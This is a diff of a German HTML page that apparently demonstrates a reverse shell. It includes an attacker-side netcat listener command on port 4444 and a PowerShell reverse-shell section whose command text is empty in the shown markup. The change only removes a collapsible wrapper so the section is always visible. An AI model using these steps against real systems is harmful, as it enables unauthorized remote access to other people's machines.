@@ -108,7 +108,6 @@
   <p>Dieser Abschnitt demonstriert ein Beispiel dafür:</p>
 
   <!-- read-more-content beim Laden ausgeblendet -->
-  <div class="read-more-content hidden">
     <p>1. Stelle sicher, dass auf deinem Angreifer-Rechner netcat (oder ncat) vorhanden ist. Damit kannst du auf Port 4444 lauschen:</p>
     <p><strong>Netcat command:</strong></p>
     <pre id="netcatCommand">ncat -lvnp 4444</pre>
@@ -122,14 +121,8 @@
     <p><strong>PowerShell Reverse Shell Command:</strong></p>
     <pre id="powershellCommand"></pre>
     <button onclick="copyToClipboard('powershellCommand')">Copy PowerShell Command</button>
-  </div>
 
   <!-- Button, um Inhalt ein- oder auszublenden -->
-  <div 
-    class="read-more-btn collapsed" 
-    onclick="toggleReadMore(this)"
-    title="Klicke, um den Abschnitt aufzuklappen">
-  </div>
 
 </body>
 </html>
